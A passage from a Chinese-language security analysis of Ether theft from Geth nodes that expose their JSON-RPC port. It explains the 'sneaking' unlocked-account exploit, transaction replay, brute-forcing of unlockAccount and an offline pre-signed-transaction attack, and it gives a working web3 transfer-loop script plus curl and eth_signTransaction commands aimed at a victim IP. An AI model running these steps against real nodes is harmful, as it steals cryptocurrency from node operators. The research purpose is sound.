    from web3 import Web3,HTTPProvider
    web3 = Web3(HTTPProvider("http://172.16.4.128:8545/"))
    web3.eth.getBalance(web3.eth.accounts[0])
    while True:
            try:
                    for i in range(3):
                            web3.eth.sendTransaction({
                                    "from":web3.eth.accounts[0],
                                    "to":web3.eth.accounts[1],
                                    "value": 1900000000000000000000000,
                                    "gas": 21000,
                                    "gasPrice": 10000000000000})
                    break
            except:
                    time.sleep(1)
                    pass
2.节点A的用户由于转账的需求，使用 `personal.unlockAccount()`
解锁账户，导致偷渡漏洞发生。由于一共进行了三次转账请求并成功广播，所以A、B、C交易缓存池中均存在这三笔交易。
3.由于网络波动等原因，此时节点 C 与其它节点失去连接。在这里用 `admin.removePeer()` 模拟节点 C 掉线。节点 B
继续挖矿，完成相应的交易。后两笔交易会因为余额不足从交易缓存池中移除，最终节点 A ，B 的交易缓存池中将不会有任何交易。
4.上述步骤 1-3 即是前文说到的 `偷渡漏洞`，被攻击者A发现其节点被攻击，迅速修改了节点A的启动命令，去除了 `--rpc --rpcaddr
0.0.0.0`，避免 `RPC` 端口暴露在公网之中。之后继续使用该账户进行了多次转账。例如，使用其它账号给节点A上的账号转账，使的节点A上的账号余额为
`1.980065000882e+24`
5.节点 C 再次连接进网络，会将其交易池中的三个交易再次广播，发送到各节点。这就造成已经移除交易缓存池的交易再次回到交易缓存池中。
6.由于此时节点A的账户余额足够，第二个交易将会被打包进区块，节点A中的余额再次被盗。
注： 在实际的场景中，不一定会出现节点 C
失去连接的情况，但由于存在大量分布式节点的原因，交易被其它节点重新发送的情况也是可能出现的。这也可以解释为什么在前文说到：
`账户余额足够时，会出现大量应该被移除的 pending 交易，在部分交易完成后，pending
交易消失的的情况`。当账户余额足够时，重新广播交易的节点会将之前所有的交易再次广播出去，在交易完成后，剩余 pending
交易会因为余额不足再次从交易缓存池中被移除。
注2: 除了本节说到的现象外，亦不排除攻击者设置了恶意的以太坊节点，接收所有的交易信息并将部分交易持续广播。但由于该猜想无法验证，故仅作为猜测思路提供。
### 3.3 unlockAccount接口的爆破攻击
> 对于暂时无法关闭对公网暴露的 `RPC` 接口的节点，在不使用 `personal.unlockAccount()` 的情况下，仍然存在被盗币的可能。
#### 3.3.1 漏洞复现
被攻击节点启动参数为： `geth --testnet --rpc --rpcaddr 0.0.0.0 --rpcapi eth,personal
console`
攻击者的攻击步骤为：
  1. 与 `偷渡漏洞` 攻击 `1-3` 步类似，攻击者探测到目标开放了 `RPC` 端口 -> 获取当前节点的区块高度、节点上的账户列表 以及 各账户的余额。根据蜜罐捕获的数据，部分攻击还会通过 `personal_listWallets` 接口进行查询，寻找当前节点上已经 `unlocked` 的账户。
  2. 调用 `personal_unlockAccount` 接口尝试解密用户账户。假如用户使用了弱口令，攻击者将会成功解锁相应账户。
  3. 攻击者可以将解锁账户中的余额全部转给自己。
攻击流程如下图所示：
#### 3.3.2 升级的爆破方式
根据偷渡漏洞的原理可以知道该攻击方式有一个弊端：如果有两个攻击者同时攻击一个节点，当一个攻击者爆破成功，那么这两个攻击者都将可以取走节点中的余额。
根据 `2.3`
节中的分析可以知道，谁付出了更多的手续费，谁的交易将会被先打包。这也陷入了一个恶性循环，盗币者需要将他们的利益更多地分给打包的矿工才能偷到对应的钱。也正是因为这个原因，蜜罐捕获到的爆破转账请求从最初的
`personal_unlockAccount` 接口逐渐变成了 `personal_sendTransaction` 接口。
`personal_sendTransaction` 接口是 `Geth` 官方在 `2018/01`
新增了一个解决偷渡漏洞的RPC接口。使用该接口转账，解密出的私钥将会存放在内存中，所以不会引起 `偷渡漏洞`
相关的问题。攻击者与时俱进的攻击方式不免让我们惊叹。
### 3.4 自动签名交易的离线攻击
> 对于曾经被盗币的节点，可能会被离线漏洞所攻击。这取决于被盗币时攻击者生成了多个交易签名。
#### 3.4.1 攻击流程复现
由于该攻击涉及到的 `eth_signTransaction` 接口在 `pyweb3` 中不存在，故攻击流程复现使用 `curl` 命令与 `JSON-RPC` 交互
攻击者IP为：10.0.0.3，账户地址为：`0xd4f0ad3896f78e133f7841c3a6de11be0427ed89`，`geth`
的启动命令为： `geth --testnet --rpc --rpcaddr 0.0.0.0 --rpcapi eth,net,personal`
被攻击者IP为： 10.0.0.4，`geth` 版本为 `1.8.11` （当前最新版本为 `1.8.12`），账户地址为
`0x9e92e615a925fd77522c84b15ea0e8d2720d3234`
1.攻击者扫描到被攻击者开放了 `8545` 端口后，可以通过多个接口获取被攻击者信息
    curl -XPOST --data '{"jsonrpc":"2.0","method":"eth_accounts","params":[],"id":1}' --header "Content-Type: application/json" http://10.0.0.4:8545
    curl -XPOST --data '{"jsonrpc":"2.0","method":"eth_getBalance","params":["0x9e92e615a925fd77522c84b15ea0e8d2720d3234","latest"],"id":1}' --header "Content-Type: application/json" http://10.0.0.4:8545
    curl -XPOST --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":null,"id":1}' --header "Content-Type: application/json" http://10.0.0.4:8545
    curl -XPOST --data '{"jsonrpc":"2.0","method":"net_version","params":null,"id":1}' --header "Content-Type: application/json" http://10.0.0.4:8545
账户里余额为0，是因为笔者没有及时同步区块。实际余额是 `0.98 ether`
2.通过 `eth_getTransactionCount` 接口获取节点账户和盗币账户之间的转账次数，用于计算 `nonce`。等待用户通过
`personal.unlockAccount()` 解锁。在用户解锁账户的情况下，通过 `eth_signTransaction`
接口持续发送多笔签名转账请求。例如：签名的转账金额是 `2 ether`，发送的数据包如下：
    curl -XPOST --data '{"jsonrpc":"2.0","method":"eth_signTransaction","params":[{"from":"0x9e92e615a925fd77522c84b15ea0e8d2720d3234","to":"0xd4f0ad3896f78e133f7841c3a6de11be0427ed89","value": "0x1bc16d674ec80000", "gas": "0x30d40", "gasPrice": "0x2dc6c0","nonce":"0x1"}],"id":1}' --header "Content-Type: application/json" http://10.0.0.4:8545 
    注： 该接口在官方文档中没有被介绍，但在新版本的geth中的确存在
攻击者会在账户解锁期间按照 `nonce` 递增的顺序构造多笔转账的签名。
3.至此，攻击者的攻击已经完成了一半。无论被攻击者是否关闭 `RPC` 接口，攻击者都已经拥有了转移走用户账户里 `2 ether`
的能力。攻击者只需监控用户账户中的余额是否超过 `2 ether` 即可。如图所示，在转入 `1.2 ether` 后，用户的账户余额已经达到 `2
ether`
攻击者在自己的节点对已经签名的交易进行广播：
    eth.sendRawTransaction("0xf86b01832dc6c083030d4094d4f0ad3896f78e133f7841c3a6de11be0427ed89881bc16d674ec80000801ba0e2e7162ae34fa7b2ca7c3434e120e8c07a7e94a38986776f06dcd865112a2663a004591ab78117f4e8b911d65ba6eb0ce34d117358a91119d8ddb058d003334ba4")
`2 ether` 被成功盗走。
相关[交易记录](https://ropsten.etherscan.io/tx/0x4c661b558a6a2325aa36c5ce42ece7e3cce0904807a5af8e233083c556fbdebc)可以在测试网络上查询到。
攻击流程图示如下：
#### 3.4.2 攻击成功的关键点解析
按照惯例，先提出问题：
  1. 为什么签名的交易可以在别的地方广播？
  2. `Geth` 官方提供的接口 `eth_sign` 是否可以签名交易？
##### 3.4.2.1 签名的有效性问题
从原理上说，离线漏洞的攻击方式亦是以太坊离线签名的一种应用。
为了保护私钥的安全性，以太坊拥有离线签名这一机制。用户可以在不联网的电脑上生成私钥，通过该私钥签名交易，将签名后的交易在联网的主机上广播出去，就可以成功实现交易并有效地保证私钥的安全性。
在 1.3
节的图中，详细的说明了以太坊实现交易签名的步骤。在各参数正确的情况下，以太坊会将交易的相关参数：`nonce`、`gasPrice`、`gas`、`to`、`value`
等值进行 `RLP` 编码，然后通过 `sha3_256` 算出其对应的 `hash` 值，然后通过私钥对 `hash` 值进行签名，最终得到
`s`、`r`、`v`。所以交易的相关参数有：
    "tx": {
            "nonce": "0x1",
            "gasPrice": "0x2dc6c0",
            "gas": "0x30d40",
            "to": "0xd4f0ad3896f78e133f7841c3a6de11be0427ed89",
            "value": "0x1bc16d674ec80000",
            "input": "0x",
            "v": "0x1b",
            "r": "0xe2e7162ae34fa7b2ca7c3434e120e8c07a7e94a38986776f06dcd865112a2663",
            "s": "0x4591ab78117f4e8b911d65ba6eb0ce34d117358a91119d8ddb058d003334ba4",